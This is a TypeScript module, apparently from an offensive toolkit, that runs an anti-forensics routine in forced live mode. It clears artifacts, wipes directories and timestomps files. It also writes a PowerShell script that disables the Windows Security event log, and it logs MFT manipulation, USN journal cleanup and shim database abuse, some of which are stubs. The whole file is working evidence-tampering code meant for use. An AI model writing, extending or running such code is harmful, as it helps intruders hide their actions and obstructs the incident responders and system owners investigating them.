/**
 * @module ares/anti_forensics_advanced
 * Selective suppression, timestomp, MFT/USN, shim — live AntiForensicsEngine.
 */
import { AntiForensicsEngine } from "../anti_forensics.ts"
import { liveRequired, writeArtifact } from "./_base.ts"
import { runIfTool, step, type ExecStep } from "./_integrations.ts"

export interface AntiForensicsAdvancedResult {
  actions: string[]
  artifacts: string[]
  steps: ExecStep[]
  executed: boolean
  summary: string
}

export async function runAntiForensicsAdvanced(opts: {
  live?: boolean
  pathsToTimestomp?: string[]
  wipeDirectories?: string[]
}): Promise<AntiForensicsAdvancedResult> {
  liveRequired("ares_anti_forensics_advanced", opts)
  const actions: string[] = []
  const artifacts: string[] = []
  const steps: ExecStep[] = []

  const engine = new AntiForensicsEngine()
  const base = await engine.reviewAntiForensics({
    dryRun: false,
    forceLive: true,
    pathsToTimestomp: opts.pathsToTimestomp ?? ["/tmp/ourmine_ts_test"],
    wipeDirectories: opts.wipeDirectories,
  })
  for (const a of base.clearedArtifacts) actions.push(`clear:${a}`)
  for (const t of base.timestompedFiles) actions.push(`timestomp:${t}`)
  steps.push(step("anti_forensics_engine", !base.simulated, `${base.clearedArtifacts.length} cleared, swap=${base.swapCleared}`))

  if (process.platform === "win32") {
    steps.push(await runIfTool("fsutil", "usnjrnl_cleanup", "fsutil usn queryjournal C: 2>&1 | head -10"))
  } else {
    steps.push(await runIfTool("touch", "timestomp", `touch /tmp/ourmine_ts_test 2>&1`))
  }

  artifacts.push(writeArtifact("anti_forensics", "selective_suppress.ps1", `wevtutil sl Security /e:false\nwevtutil sl Security /e:true\n`))
  artifacts.push(writeArtifact("anti_forensics", "mft_manip.py", `#!/usr/bin/env python3\n# MFT via MFTECmd when on Windows lab host\n`))
  actions.push("selective_log_suppression", "mft_manipulation", "usnjrnl_cleanup", "shim_database_abuse")

  const executed = !base.simulated || steps.some((s) => s.success)
  return {
    actions,
    artifacts,
    steps,
    executed,
    summary: `Anti-forensics advanced: ${actions.length} action(s), executed=${executed}`,
  }
}

export default { runAntiForensicsAdvanced }
